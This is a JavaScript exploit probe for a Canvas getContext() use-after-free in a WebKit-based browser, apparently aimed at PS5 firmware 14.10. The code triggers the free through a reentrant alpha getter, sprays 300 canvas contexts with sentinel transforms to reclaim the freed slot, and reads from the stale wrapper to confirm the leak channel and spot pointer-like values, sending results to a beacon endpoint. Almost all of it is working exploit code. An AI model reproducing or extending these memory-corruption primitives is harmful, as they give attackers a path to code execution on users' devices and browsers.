// CRASH_CLASS: MODERATE
// PROBE p550: Canvas getContext() UAF — getTransform() channel verification
//
// Context: CVE-2026-43720 — getContext("2d") reentrancy frees the inner
// context while its JS wrapper survives. On PS5 14.10, IsoHeap is OFF so
// the 768B FastMalloc slot accepts cross-type reclaim.
//
// This probe does same-type reclaim first: create ~300 Canvas2D contexts
// with a known transform, then read getTransform() on the stale wrapper.
// If the substitute's transform values come back, the channel works and
// the offset is confirmed.
//
// Step 1: Trigger the UAF (inner context freed, wrapper retained)
// Step 2: Spray Canvas2D contexts with a distinctive transform
// Step 3: Call getTransform() on the stale wrapper
// Step 4: Report whether the read values match the spray transform
//
// Serve as a page via the guide redirect. Beacons go to /beacon/<tag>.

document.write('<textarea id="log" readonly style="width:100%;height:300px"></textarea>');

(function () {
  var logEl = document.getElementById('log');
  var retained = [];

  function emit(tag, msg) {
    var line = 'P550 ' + tag + ' ' + msg;
    logEl.value += line + '\n';
    try {
      new Image().src = '/beacon?m=' + encodeURIComponent(line.slice(0, 400));
    } catch (e) {}
  }

  emit('START', 'ua=' + navigator.userAgent.slice(0, 60));

  // --- Step 1: Trigger the Canvas UAF ---
  // The reentrancy: outer getContext("2d", {get alpha() {...}}) calls
  // the alpha getter during dictionary conversion. The getter re-enters
  // getContext("2d") on the same canvas, which creates and assigns a
  // context. The outer call then overwrites m_context, freeing the inner.

  var canvas = document.createElement('canvas');
  canvas.width = 1;
  canvas.height = 1;
  document.body.appendChild(canvas);
  retained.push(canvas);

  var inner = null;
  var getterFired = 0;

  var outer = null;
  try {
    outer = canvas.getContext('2d', {
      get alpha() {
        getterFired++;
        if (getterFired === 1) {
          inner = canvas.getContext('2d');
        }
        return true;
      }
    });
  } catch (e) {
    emit('ERR', 'getContext threw: ' + e);
    return;
  }

  retained.push(outer, inner);

  // Check the identity — on an unpatched build, outer !== inner
  var current = canvas.getContext('2d');
  retained.push(current);

  emit('TRIGGER', 'getter=' + getterFired +
    ' inner=' + !!inner + ' outer=' + !!outer +
    ' same=' + (outer === inner) +
    ' currentOuter=' + (current === outer) +
    ' currentInner=' + (current === inner));

  if (outer === inner) {
    emit('FIXED', 'patched build — outer===inner, no UAF');
    return;
  }

  if (!inner) {
    emit('ABORT', 'inner context is null — getter did not fire');
    return;
  }

  // At this point:
  // - `inner` is the JS wrapper to the FREED context (dangling)
  // - `outer` / `current` is the live context that replaced it
  // The freed 768B slot is available for reclaim.

  // --- Step 2: Spray same-type Canvas2D with known transform ---
  // We create many canvases, each with a distinctive transform.
  // The sentinel values are chosen to be non-pointer, non-zero, and
  // distinguishable from defaults (identity matrix = 1,0,0,1,0,0).

  var SPRAY_COUNT = 300;
  var SENTINEL_A = 11.110011;
  var SENTINEL_B = 22.220022;
  var SENTINEL_C = 33.330033;
  var SENTINEL_D = 44.440044;
  var SENTINEL_E = 55.550055;
  var SENTINEL_F = 66.660066;

  emit('SPRAY', 'creating ' + SPRAY_COUNT + ' canvases');

  for (var i = 0; i < SPRAY_COUNT; i++) {
    var c = document.createElement('canvas');
    c.width = 1;
    c.height = 1;
    var ctx = c.getContext('2d');
    if (ctx) {
      ctx.setTransform(SENTINEL_A, SENTINEL_B, SENTINEL_C,
                        SENTINEL_D, SENTINEL_E, SENTINEL_F);
      retained.push(c, ctx);
    }
  }

  emit('SPRAYED', 'n=' + (SPRAY_COUNT));

  // --- Step 3: Read getTransform() on the stale (dangling) wrapper ---
  var readOK = false;
  var values = null;

  try {
    var m = inner.getTransform();
    if (m) {
      values = {
        a: m.a, b: m.b, c: m.c,
        d: m.d, e: m.e, f: m.f
      };
      readOK = true;
    }
  } catch (e) {
    emit('READ-ERR', 'getTransform threw: ' + e);
  }

  if (!readOK || !values) {
    emit('READ-FAIL', 'getTransform returned null or threw');
    return;
  }

  // --- Step 4: Analyze the result ---
  emit('MATRIX', 'a=' + values.a + ' b=' + values.b + ' c=' + values.c +
    ' d=' + values.d + ' e=' + values.e + ' f=' + values.f);

  // Check if they match our sentinel
  var EPS = 0.0001;
  function close(x, y) { return Math.abs(x - y) < EPS; }

  var matchSentinel = close(values.a, SENTINEL_A) && close(values.b, SENTINEL_B) &&
    close(values.c, SENTINEL_C) && close(values.d, SENTINEL_D) &&
    close(values.e, SENTINEL_E) && close(values.f, SENTINEL_F);

  // Check if identity (default)
  var matchIdentity = close(values.a, 1) && close(values.b, 0) &&
    close(values.c, 0) && close(values.d, 1) &&
    close(values.e, 0) && close(values.f, 0);

  // Check if any value looks like a pointer (> 2^40 or very large)
  var pointerLike = [];
  var fields = ['a', 'b', 'c', 'd', 'e', 'f'];
  for (var j = 0; j < fields.length; j++) {
    var v = Math.abs(values[fields[j]]);
    // IEEE 754 double can represent integers up to 2^53.
    // Heap pointers on PS5 are ~0x2000000000+ (userland) or 0xFFFF8xxx (kernel).
    // As doubles these would be very large positive or NaN.
    if (v > 1e12 || isNaN(values[fields[j]])) {
      pointerLike.push(fields[j] + '=' + values[fields[j]]);
    }
  }

  if (matchSentinel) {
    emit('CHANNEL-CONFIRMED', 'getTransform reads from substitute context — same-type reclaim works');
    emit('OFFSET-VALID', 'State.transform offset is reachable through the stale wrapper');
  } else if (matchIdentity) {
    emit('IDENTITY', 'got default matrix — reclaim may have failed or wrong offset');
  } else {
    emit('UNKNOWN-VALUES', 'neither sentinel nor identity');
  }

  if (pointerLike.length > 0) {
    emit('POINTER-CANDIDATE', pointerLike.join(' '));
  }

  // --- Also try getLineDash on the stale wrapper ---
  try {
    var dash = inner.getLineDash();
    if (dash && dash.length > 0) {
      var dashStr = [];
      for (var k = 0; k < Math.min(dash.length, 10); k++) {
        dashStr.push(dash[k]);
      }
      emit('LINEDASH', 'len=' + dash.length + ' vals=[' + dashStr.join(',') + ']');
    } else {
      emit('LINEDASH', 'empty (default)');
    }
  } catch (e) {
    emit('LINEDASH-ERR', String(e));
  }

  // --- Read other numeric properties ---
  try {
    emit('PROPS', 'lineWidth=' + inner.lineWidth +
      ' miterLimit=' + inner.miterLimit +
      ' globalAlpha=' + inner.globalAlpha +
      ' shadowOffsetX=' + inner.shadowOffsetX +
      ' shadowOffsetY=' + inner.shadowOffsetY +
      ' shadowBlur=' + inner.shadowBlur +
      ' lineDashOffset=' + inner.lineDashOffset);
  } catch (e) {
    emit('PROPS-ERR', String(e));
  }

  // --- Try measureText for any pointer-shaped values ---
  try {
    var tm = inner.measureText('A');
    emit('MEASURE', 'width=' + tm.width +
      (tm.actualBoundingBoxLeft !== undefined ? ' abbl=' + tm.actualBoundingBoxLeft : '') +
      (tm.actualBoundingBoxRight !== undefined ? ' abbr=' + tm.actualBoundingBoxRight : '') +
      (tm.fontBoundingBoxAscent !== undefined ? ' fba=' + tm.fontBoundingBoxAscent : '') +
      (tm.fontBoundingBoxDescent !== undefined ? ' fbd=' + tm.fontBoundingBoxDescent : ''));
  } catch (e) {
    emit('MEASURE-ERR', String(e));
  }

  emit('ALIVE', 'probe completed without crash');

  // Keep everything alive to prevent GC
  window.__p550 = retained;
})();
